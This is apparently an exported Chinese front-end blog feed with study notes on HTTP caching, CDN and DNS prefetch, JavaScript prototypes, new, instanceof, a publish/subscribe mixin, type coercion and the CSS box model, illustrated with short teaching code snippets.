<h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><p>直接从disk cache中读取或者从memory cache中获取，在chrome的network面板中可看到状态码为200，并且标明缓存来源。HTTP/1.0版本的Expires响应头用于标识客户端资源的有效性，值是一个GMT绝对时间，表明如果在所表明的时间内访问资源时，就会命中强缓存。HTTP/1.1版本的max-age是一个相对时间单位，用秒来表示，表明在响应正确返回时间之后的多长时间内访问该资源时，命中强缓存。</p>
<p>二者起到的作用是相同的，只不过分别是HTTP/1.0和HTTP/1.1的产物，Expires头只是为了向后兼容。如果同时出现，则max-age起作用，也就意味着max-age优先级更高。</p>
<p>强缓存固然可以提升性能，但是也有它自己的问题。就是我们命中的缓存资源可能不是最新的。此时就需要协商缓存了。</p>
<h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>浏览器向服务器发送请求，服务器会根据请求头中的内容来决定返回的内容。如果命中协商缓存，则返回304状态码并在响应头中附上相关信息通知浏览器从缓存中读取缓存。需要配合cache-control一起使用。</p>
<p>cache-control中相关的头列举如下：</p>
<ul>
<li>last-modified和if-modified-since：当服务器向浏览器第一次发送请求的内容时，会将文件的最后修改时间发送给客户端。这个时间被附加在响应头中的last-modified中体现。当我们再次向服务器请求该资源时，会在请求中配置if-modified-since头，其值为服务器上次告知我们的last-modified值，服务器接收到该请求时，会判断该资源是否发生了更新，如果没有更新，就返回304，浏览器从缓存中读取资源，节省带宽。而如果发生更新了，就像第一次发送请求那样，返回最新的资源。</li>
</ul>
<p>但是这种策略也有着自己的缺点：</p>
<ul>
<li>有些服务器不能获取到精确的修改时间</li>
<li>文件修改时间改变了，但是文件内容并没有改变</li>
</ul>
<p>所以就有了另外一种利用文件内容来协商缓存的机制，这种方法涉及到以下两个头字段：</p>
<ul>
<li>ETag和If-None-Match：ETag是服务器端对请求资源文件的唯一标识，和之前的一样。第一次向服务器发送请求，服务端会把资源的etag值通过ETag字段返回给客户端，而再次请求该资源时，浏览器会在请求头中的If-None-Match字段中标识出上次返回的ETag，服务器拿到这个ETag值和服务端资源的ETag进行对比，由于每次文件内容的变化都会重新计算ETag，所以更加有效地通过文件内容是否修改来控制缓存，实现了更加精准的控制。</li>
</ul>
<p>下面通过三个方面来对比这两种协商缓存的策略：</p>
<ul>
<li>精确度上：根据modified来判断只能精确到秒，当文件在1秒内改变多次时，客户端不能及时感知到文件的变化。而ETag值在精确度就更胜一筹。此外，在负载均衡的服务器上，各个服务器的last-modified时间并不能保证完全一致</li>
<li>性能上，last-modified策略要优于ETag策略，因为前者只是记录文件的修改时间，而后者需要服务器通过相应算法计算出一个hash值。</li>
<li>优先级上，ETag要优先于Last-Modified。</li>
</ul>
<p>总结一下，强缓存优先于协商缓存进行。如果强缓存生效，则返回强缓存的内容，如果协商缓存生效，则如果服务端资源文件改变，返回200状态码并返回最新的资源内容。否则返回304，从缓存中读取资源，并存入浏览器缓存。</p>
<h3 id="用户行为和缓存"><a href="#用户行为和缓存" class="headerlink" title="用户行为和缓存"></a>用户行为和缓存</h3><ul>
<li>地址栏访问，链接跳转，触发浏览器缓存机制</li>
<li>F5刷新，设置max-Age为0，跳过强缓存，会进行协商缓存</li>
<li>ctrl + F5会跳过强缓存和协商缓存</li>
</ul>
<h2 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h2><p>CDN(content delivery network)，中文名叫内容分发网络。我们将服务器的静态资源缓存到CDN服务商部署的节点上，当我们的用户请求服务器资源时，会就近选择CDN节点进行资源获取，而节点会根据缓存的内容，向服务器请求，如果缓存资源最新，则返回这个缓存的资源，否则向服务器请求到最新资源并缓存在节点上，这样后续的用户都能访问到这个最新的内容了。</p>
<h2 id="预解析DNS"><a href="#预解析DNS" class="headerlink" title="预解析DNS"></a>预解析DNS</h2><p>使用prefetch技术告诉浏览器我们可能在未来需要用到的资源，通过link标签的rel属性设置为dns-prefetch来启用，href中设置url。当我们之后请求对应的url时，就免去了dns解析的时间。</p>
<h2 id="懒加载"><a href="#懒加载" class="headerlink" title="懒加载"></a>懒加载</h2><p>懒加载也叫延迟加载，是指在长网页中，在用户可视区域外的内容会进行延迟加载，与图片预加载正好相反，适用于图片很多，网页很长的电商网站。</p>
]]></content>
      <categories>
        <category>front-end</category>
      </categories>
      <tags>
        <tag>performance</tag>
      </tags>
  </entry>
  <entry>
    <title>原型和原型链</title>
    <url>/2017/12/31/%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
    <content><![CDATA[<p>构造函数大写字母开头，可以使用new操作符创建实例。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name=name</span><br><span class="line">  <span class="keyword">this</span>.age  = age</span><br><span class="line">  <span class="keyword">this</span>.class = <span class="string">'class-1'</span></span><br><span class="line">  <span class="comment">// return this默认返回this实例对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f  = <span class="keyword">new</span> Foo(<span class="string">'zhnagsan'</span>, <span class="number">20</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li><p>var a = {}是var a = new Object()的语法糖</p>
</li>
<li><p>var a = []是var a = new Array()的语法糖</p>
</li>
<li><p>function Foo(){}是var Foo = new Function(..)</p>
</li>
<li><p>instanceof是用于判断引用类型属于哪个构造函数的方法。比如上述代码，f是Foo的一个实例，判断方法是f的_proto_属性，一层一层向上，能否对应到Foo的显式原型对象。f instanceof Object也是正确的，需要向上追溯两层。</p>
</li>
<li><p>所有引用类型，包括数组对象函数都可以自由扩展属性（除了null对象）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;obj.a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> arr = [];arr.a = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">fn.a = <span class="number">100</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>都有一个_proto_（隐式原型）属性，为一个普通对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj._proto_);</span><br><span class="line"><span class="built_in">console</span>.log(arr._proto_);</span><br><span class="line"><span class="built_in">console</span>.log(fn._proto_);</span><br></pre></td></tr></table></figure></li>
<li><p>所有的函数都有一个prototype（显式原型）属性，是一个普通对象即原型对象；而原型对象有一个constructor属性，用来指定该对象的构造函数，比如M是个构造函数，那么M.prototype.constructor === M<a id="more"></a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fn.prototype)</span><br></pre></td></tr></table></figure></li>
<li><p>并且所有对象的隐式原型指向构造函数的显式原型</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj._proto_ === <span class="built_in">Object</span>.prototype</span><br></pre></td></tr></table></figure></li>
<li><p>试图得到一个对象的属性时，如果这个对象没有这个属性，就到他的_proto_（构造函数的显式原型）中寻找；</p>
</li>
<li><p>for in循环可以遍历对象的所有的可枚举属性，包括自身的和从构造函数原型继承的属性，有时候只想得到对象自身的属性而不是继承的属性，需要写如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> item;</span><br><span class="line"><span class="keyword">for</span> (item <span class="keyword">in</span> f) &#123;</span><br><span class="line"><span class="keyword">if</span>(f.hasOwnProperty(item))&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于如下这段代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;;</span><br><span class="line">Foo.prototype.alertName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建实例</span></span><br><span class="line"><span class="keyword">var</span> f=<span class="keyword">new</span> Foo(<span class="string">'Zhangsam'</span>);</span><br><span class="line">f.printName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line">f.printName();</span><br><span class="line">f.alertName();</span><br><span class="line">f.toString();</span><br></pre></td></tr></table></figure>
<p>在上面这三种情况下，究竟分别是怎样找到对应的属性呢，这里面涉及到JavaScript中的属性查找规则，正如我们第九条中所言，对于printName而言，首先在f自身中寻找printName属性，发现有这个属性，那么就停止查找了；</p>
</li>
</ol>
<p>然后对于alertName，情况就有意思一点了，因为f自身是没有alertName这个属性的，那么此时就需要到f的隐式原型也就是_proto_对象中查找这个属性，也就是在构造函数Foo的显式原型中寻找这个属性，发现我们刚好在上面有所定义，那么就结束查找；</p>
<p>对于第三种情况来说，情况就更有意思的多，我们在构造函数的原型对象中也没有发现toString方法，就需要继续沿着原型链向上查找，此时就需要找到Foo的构造函数的显示原型对象，而对象的构造函数就是Object，所以我们就找到了Object的原型对象上定义的toString方法；</p>
<p>而JavaScript为了避免死循环，规定Object.prototype.<strong>proto</strong>为null，即Object.<strong>proto</strong>就是整个原型链的顶端。</p>
<p>并且Function.prototype.<strong>proto</strong>===Object.prototype，这也说明了为什么函数就是对象。<br>12. 构造函数的显式原型对象上的方法是被所有实例共有的</p>
<h3 id="如何创建一个对象"><a href="#如何创建一个对象" class="headerlink" title="如何创建一个对象"></a>如何创建一个对象</h3><ul>
<li><p>对象字面量和对象构造函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">name</span>: <span class="string">'o1'</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> o11 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;<span class="attr">name</span>: <span class="string">'o11'</span>&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用显示的构造函数创建对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'o2'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> M();</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Object的create方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = &#123;<span class="attr">name</span>: <span class="string">'p'</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="built_in">Object</span>.create(p);</span><br></pre></td></tr></table></figure>
<p>创建的对象是用原型链连接的，o3.<em>proto</em> === p</p>
</li>
</ul>
<hr>
<h3 id="instanceof的原理"><a href="#instanceof的原理" class="headerlink" title="instanceof的原理"></a>instanceof的原理</h3><p>instanceof的原理就是判断实例对象的隐式原型对象_proto_是不是和构造函数的prototype属性引用自同一个对象。只要是在原型链上面的构造函数对于instanceof方法来说都会返回true。</p>
<p>instanceof由于会追溯原型链上面的对象，所以不够严谨，我们还有一种方法是通过实例对象的_proto_对象的constructor属性的指向来判断他的构造函数，这个构造器属性就指向实例对象的构造函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> M();</span><br><span class="line">m.__proto__.constructor === M</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="如何准确判断一个变量是数组类型"><a href="#如何准确判断一个变量是数组类型" class="headerlink" title="如何准确判断一个变量是数组类型"></a>如何准确判断一个变量是数组类型</h3><p>利用instanceof Array</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[];</span><br><span class="line">arr <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">//true</span></span><br><span class="line"><span class="keyword">typeof</span> arr <span class="comment">//Object</span></span><br></pre></td></tr></table></figure>
<p>而typeof无法判断段是否是数组</p>
<hr>
<h3 id="写一个原型链继承的例子"><a href="#写一个原型链继承的例子" class="headerlink" title="写一个原型链继承的例子"></a>写一个原型链继承的例子</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.eat = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'animal eat'</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//狗</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.bark = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'dog bark'</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line">Dog.prototype=<span class="keyword">new</span> Animal();</span><br><span class="line"><span class="comment">//哈士奇</span></span><br><span class="line"><span class="keyword">var</span> hashiqi = <span class="keyword">new</span> Dog();</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="描述new一个对象的过程"><a href="#描述new一个对象的过程" class="headerlink" title="描述new一个对象的过程"></a>描述new一个对象的过程</h3><ol>
<li>创建一个空对象，继承了构造函数的prototype对象</li>
<li>构造函数被执行。执行的时候，相应的参数被传入，同时this指向这个新实例（new Foo等同于new Foo()）。</li>
<li>如果构造函数返回了一个“对象”，那么这个对象会取代整个new出来的结果。如果构造函数没有返回对象。那么new出来的结果是步骤1创建的对象。</li>
</ol>
<p>下面用代码演示new运算符背后的工作原理</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> new2 = <span class="function"><span class="keyword">function</span> (<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> o = <span class="built_in">Object</span>.create(func.prototype);</span><br><span class="line">  <span class="keyword">var</span> k = func.call(o);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> k === <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在学习这个知识的时候，发现了一个很有意思的事情就是我们在使用new操作符去实例化一个构造函数的时候，如果构造函数明确返回一个对象，那么new构造函数才会返回那个对象；否则任何情况下都会返回实例化后的对象，这也是理解new操作符原理的关键。</p>
<hr>
<h3 id="zepto源码中如何使用原型链"><a href="#zepto源码中如何使用原型链" class="headerlink" title="zepto源码中如何使用原型链"></a>zepto源码中如何使用原型链</h3><p>下面是一个封装DOM查询的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Elem</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.elem = <span class="built_in">document</span>.getElementById(id)</span><br><span class="line">&#125;</span><br><span class="line">Elem.prototype.html = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  <span class="keyword">if</span>(val)&#123;</span><br><span class="line">  elem.innerHTML=val</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> elem.innerHTML&#125;</span><br><span class="line">&#125;</span><br><span class="line">Elem.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">type, fn</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  elem.addEventListener(type, fn);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">var</span> div1 = <span class="keyword">new</span> Elem(<span class="string">'div1'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(div1.html());</span><br><span class="line">  div1.html(<span class="string">'&lt;p&gt;hello world&lt;/p&gt;'</span>);</span><br><span class="line">  div1.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


<hr>
<p>2017 年 12月 31日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>发布/订阅模式</title>
    <url>/2019/02/22/%E5%8F%91%E5%B8%83-%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="发布-订阅模式（观察者模式）"><a href="#发布-订阅模式（观察者模式）" class="headerlink" title="发布/订阅模式（观察者模式）"></a>发布/订阅模式（观察者模式）</h1><p>观察者模式中存在两种类型的实体，一种是观察者（observer或者subscriber），一种是订阅者发布者或者主体（publisher或subject）。当某事件触发时发布者通知（调用）所有的订阅者并且可以向订阅者传递消息。</p>
<h2 id="报纸订阅例子"><a href="#报纸订阅例子" class="headerlink" title="报纸订阅例子"></a>报纸订阅例子</h2><p>paper对象作为publisher对象，拥有subscribers数组属性，subscribe方法，unsubscribe方法以及publish方法。</p>
<p>我们在subscribers中维护我们的订阅者，subscribe方法中添加订阅者到数组中，而unsubscribe方法从数组中移除订阅者，而publish方法则遍历数组并调用它们注册时提供的方法。</p>
<p>所有这些方法还需要有个type参数，因为paper对象可以发射多种类型事件，而我们的订阅者可以只订阅其中一种事件。对于任何的发布者对象这些成员都是一致的，所以我们可以使用mixin模式将他们copy到任何对象中使之成为一个publisher。</p>
<p>简单说明mixin模式，就是将多个对象上的属性混合到一个对象上，如这里简单的实现，只适用于浅拷贝场景：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mix</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arg, prop, child = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (arg = <span class="number">0</span>; arg &lt; <span class="built_in">arguments</span>.length; arg += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (prop <span class="keyword">in</span> <span class="built_in">arguments</span>[arg]) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">arguments</span>[arg].hasOwnProperty(prop)) &#123;</span><br><span class="line">        child[prop] = <span class="built_in">arguments</span>[arg][prop];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> child;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>变量类型和计算</title>
    <url>/2017/12/30/%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E4%B8%8E%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p>变量类型分为值类型和引用类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">a = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b);   <span class="comment">//100</span></span><br></pre></td></tr></table></figure>
<p>这就是值类型，变量之间不会相互影响，a位置存的就是一个数字，b位置野村的是相同的数字而已</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">age</span>:<span class="number">20</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b.age = <span class="number">21</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.age);  <span class="comment">//21</span></span><br></pre></td></tr></table></figure>
<p>引用类型（包含数组，对象和函数）的变量之间会互相影响，a位置存的是一个指针指向该对象，实际上对象存在另外的地方，定义的b存放的指针也指向该对象，所以修改了对象的指针，为了让内存共用空间才出现了引用类型。</p>
<a id="more"></a>

<h3 id="JS使用typeof可以得到的类型"><a href="#JS使用typeof可以得到的类型" class="headerlink" title="JS使用typeof可以得到的类型"></a>JS使用typeof可以得到的类型</h3><p>typeof一共有7种形式，分别是undefined,object,string,boolean,symbol,function和number,注意typeof null也是object！只能区分值类型，不能区分除函数外的其他引用类型。</p>
<hr>
<h3 id="值类型的强制类型转换"><a href="#值类型的强制类型转换" class="headerlink" title="值类型的强制类型转换"></a>值类型的强制类型转换</h3><ol>
<li>字符串拼接<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span> + <span class="number">10</span>;  <span class="comment">// 110</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="number">100</span> + <span class="string">'10'</span>;  <span class="comment">//  10010</span></span><br></pre></td></tr></table></figure></li>
<li>==运算符<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span> == <span class="string">'100'</span>; <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">' '</span>; <span class="comment">//true</span></span><br><span class="line"><span class="literal">null</span> == underfined  <span class="comment">//true</span></span><br></pre></td></tr></table></figure></li>
<li>if语句<br> 0，NaN，空字符串，null,undefined,false转换为false</li>
<li>逻辑运算</li>
</ol>
<hr>
<h3 id="何时使用"><a href="#何时使用" class="headerlink" title="何时使用==="></a>何时使用===</h3><p>三等无类型转换，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(obj.a == <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="comment">// 这里相当于obj.a === null || obj.a === undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除此之外，全部用三等。</p>
<hr>
<h3 id="JS的内置函数"><a href="#JS的内置函数" class="headerlink" title="JS的内置函数"></a>JS的内置函数</h3><p>不考虑运行环境，内置的数据封装类对象有如下9种</p>
<ol>
<li>Object</li>
<li>Array</li>
<li>Boolean</li>
<li>Number</li>
<li>String</li>
<li>Function</li>
<li>Date</li>
<li>RegExp</li>
<li>Error</li>
</ol>
<hr>
<h3 id="JS按照存储方式分为几种类型"><a href="#JS按照存储方式分为几种类型" class="headerlink" title="JS按照存储方式分为几种类型"></a>JS按照存储方式分为几种类型</h3><p>分为值类型和引用类型。<br>引用类型是变量指针的赋值。</p>
<hr>
<h3 id="如何理解JSON"><a href="#如何理解JSON" class="headerlink" title="如何理解JSON"></a>如何理解JSON</h3><p>JSON不是函数，和Math一样是个内置对象，常用的有两个方法，分别是字符串转对象和对象转字符串的parse和stringify方法</p>
<hr>
<p>2017 年 12月 30日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>可视化模型概述</title>
    <url>/2017/12/31/%E5%8F%AF%E8%A7%86%E5%8C%96%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<p>作为css系列文章的第一篇，本文主要是通过阅读”css mastry”第三版整理而成，还希望大家指正。</p>
<p>在本篇文章中，我们着重学习理解CSS盒模型，外边距是如何以及为什么会发生合并的，不同的定位属性和值，浮动和清除浮动是如何工作的以及格式化上下文到底是个什么东西这五个问题。</p>
<a id="more"></a>

<h3 id="盒模型回顾"><a href="#盒模型回顾" class="headerlink" title="盒模型回顾"></a>盒模型回顾</h3><p>我们知道，页面中的每一个元素都是一个由内容区，内边距，边框和外边距组成的矩形盒子。</p>
<p>内边距包围在内容区周边，比如我们为元素设定一个background属性，那么这个background就被应用到内容区和内边距区域。就其本身而言，内边距刚好形成了一个槽，就可以避免内容区与边框直接接触。</p>
<p>而边框就是在内边距外边形成的线，可以有点状，实线，虚线等多种样式。</p>
<p>在边框外面就是外边距，是盒子可视部分以外的透明区域，允许我们控制页面元素之间的距离。</p>
<p>而另一个不影响布局的属性是outline属性，这个属性在元素的边框外面画一条线，不影响盒子的宽高，在debug一些复杂的布局和证明一个布局效应的时候会比较有用。</p>
<p>内边距，边框和外边距默认是为零的，但是一些用户代理样式表会为许多元素设定内边距和外边距，比如，标题元素总是默认存在一些外边距，并且这些随着浏览器的不同而变得不同，我们可以在自己定义的样式表中重写这些属性或者使用引入的css reset样式表。</p>
<hr>
<h4 id="box-sizing"><a href="#box-sizing" class="headerlink" title="box-sizing"></a>box-sizing</h4><p>在默认情况下，元素的宽高属性指的是内容盒的宽度和高度，为元素添加内边距和边框不会影响内容盒的大小而是会增加元素盒子的整体大小。如果你想要一个5px内边距，5px边框在每一边，并且总的宽度为100px，就需要设置元素的width属性为80px。此外，如果盒子还有个10px的外边距，那么它就会占据总共120px的空间。</p>
<p>我们可以通过box-sizing这个属性去改变盒子模型宽度的计算方式，默认的box-sizing值为content-box，而其表现正如我们上面所述。但是，有另外的方式去影响宽高在响应式布局中是非常有用的。</p>
<p>我们可以设置box-sizing的属性为border-box，这样一来，宽高的计算方式就包含进了内边距和边框以及内容盒子的宽高，但依然不包括外边距，而外边距依然影响着元素占据的总空间。对于上面的例子而言，我们就可以设置box-sizing的值为boeder-box，这时就不用计算得到内容区的宽度了，而只需要设置宽度为100px就好了，其他的属性和值保持依旧，就实现了和上面一样的效果了。也可以理解为border-box之后，设定的width属性就是盒子的可视区域宽度。</p>
<p>那么为什么这样是有用的呢？在许多情况下，这种处理宽高的方式都是更符合人的直觉的，并且这也是在IE6之前的IE浏览器实际的工作方式。</p>
<p>内边距，边框和外边距可以被应用到盒子的一边或者多边，外边距也能够被赋予一个负的值，这在一些拉入和抽出元素本身在页面的位置的场景下是比较有用的，后面的文章里会讨论这些技术。</p>
<p>你可以用任何长度单位比如px，ems和百分比去度量在CSS声明中去为元素添加内边距和外边距。使用百分比外边距的时候会有一些奇怪的行为确实值得提一下，假设上面的例子，我们设置左侧外边距为5%会发生什么呢？</p>
<p>答案就是左侧外边距为父元素5%的宽度，比如父元素的宽度为100px，那么它的左<br>侧外边距就为5px。</p>
<p>当设置上下外边距为百分比形式的时候，你可能会认为，这个百分比来自于父元素的高度。这看来似乎是符合逻辑的，然而，因为高度通常是不显式声明的，而且可能因为随着内容区高度的变化变得失控，所以CSS规范中也说明上下外边距和内边距的百分比来自于它的包含块的宽度。在这个例子中，包含块就是父级元素，但是包含块是可以变化的。我们将会在后面的文章里面阐述这究竟意味着什么。</p>
<hr>
<h4 id="最小和最大值"><a href="#最小和最大值" class="headerlink" title="最小和最大值"></a>最小和最大值</h4><p>有时候为元素应用最小宽度和最大宽度在响应式布局中可能是非常有用的，因为它允许块级元素默认自动填充满父级元素的宽度，但是不会缩减到更窄以至于小于最小宽度指定的值，或者是拉伸到更宽以至大于最大宽度指定的值。</p>
<p>相似地，最小高度和最大高度也同样存在，但是当在CSS中应用任何高度值你应该特别小心。因为元素的高度最好是被它包含的内容所隐式指定。否则，如果内容增加的时候，或者文本大小改变了，内容将会溢出固定高度的盒子。如果你因为某种原因确实要设置默认的高度，用min-height属性是更好的，因为它能够让你的盒子随着内容扩展而增大。</p>
<hr>
<h3 id="视觉格式化模型"><a href="#视觉格式化模型" class="headerlink" title="视觉格式化模型"></a>视觉格式化模型</h3><p>随着对盒模型的理解，我们能够开始探索一些视觉格式化和定位模型。</p>
<p>人们经常把p元素，h1元素和article元素叫做块级元素。这意味着他们视觉上是作为内容块或者块级盒子（block boxes）显示的。相反地，像strong，span和time元素被描述成内联级元素，因为他们的元素作为内联盒子（inline boxes）在行（lines）内显示。</p>
<p>通过元素的display属性可以改变生成盒子的类型。这意味着你可以通过设置像span一样的内联元素的display属性为block使得它可以表现的像一个块级盒子一样。也可以通过设置display属性为none使得元素根本不生成任何盒子，如此一来，这个盒子就不再显示并且在文档中占据任何空间了。</p>
<p>在CSS中有许多不同的定位模型，包括浮动，绝对定位和相对定位。除非特别指定，所有的盒子生下来就是默认定位在normal flow中并且默认值为static。如同名字表达的意思一样，在normal flow中的盒子的位置将会按照HTML文档的顺序被安排。</p>
<p>块级盒子将会一个接一个的出现在垂直位置上。盒子间的垂直距离将会被盒子的垂直外边距计算。</p>
<p>内联盒子在一行上被水平布局，遵循文本流并且在换行时换行到新行。他们的水平空间可以通过水平内边距边框和外边距调整，然而，垂直内边距边框和外边距将不会对一个inline box产生影响。类似地，指定一个明确的宽度和高度也是没有任何作用的。</p>
<p>一行文本形成的水平方向的盒子被叫做一个line-box，并且一个line-box总是足够高到容纳他所有的inline-box。唯一改变line-box尺寸的方式就是修改行高或者在他内部的inline-box的水平内边距边框和外边距。</p>
<p>你也可以设置元素的display属性为inline-block，如同名字表达的那样，这个声明使得元素水平对齐就好像inline-box那样。然而，盒子的内部表现的就像盒子是块级一样，看可以被精确地指定宽度高度垂直内边距和外边距等。</p>
